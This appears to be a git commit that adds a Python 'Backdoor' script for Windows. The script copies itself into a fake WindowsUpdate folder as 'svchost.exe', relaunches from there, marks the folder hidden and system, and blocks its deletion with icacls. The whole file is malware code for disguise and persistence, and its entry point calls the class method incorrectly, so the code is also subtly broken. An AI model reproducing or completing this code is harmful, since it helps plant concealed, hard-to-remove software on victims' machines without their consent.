8ab40e12bef787b9775fe6bba7a744fc753a0673
Callumgm <callumgm20052005@gmail.com>
2022-09-21 20:57:20 +0100

    Initial Commit

---
+++ main.py
@@ -0,0 +1,33 @@
+
+### System Modules ###
+import os
+import sys
+import shutil
+import subprocess
+
+class Backdoor:
+
+    def __init__(self):
+        self.folder  = os.environ["appdata"] + "\\WindowsUpdate"
+        if not os.path.exists(self.folder): os.mkdir(self.folder)
+        self.bd_path = self.folder + "\\svchost.exe"
+        self.path    = sys.argv[0]
+
+    def hide(self):
+        if os.path.exists(self.folder):
+            subprocess.call("icacls " + self.folder + " /deny Everyone:(OI)(CI)(DE,DC)", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+            subprocess.call("attrib +h +s "+ self.folder ,stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+
+    def start(self):
+        if self.path != self.bd_path:
+            try:
+                shutil.copy2(self.path, self.bd_path)      # Copy the file to the backdoor folder
+                os.startfile(self.bd_path)          # Start the file
+                self.hide()
+                os._exit(1)
+            except: pass
+        else: return True
+
+
+if __name__ == "__main__":
+    if not Backdoor.start(): os._exit(1)
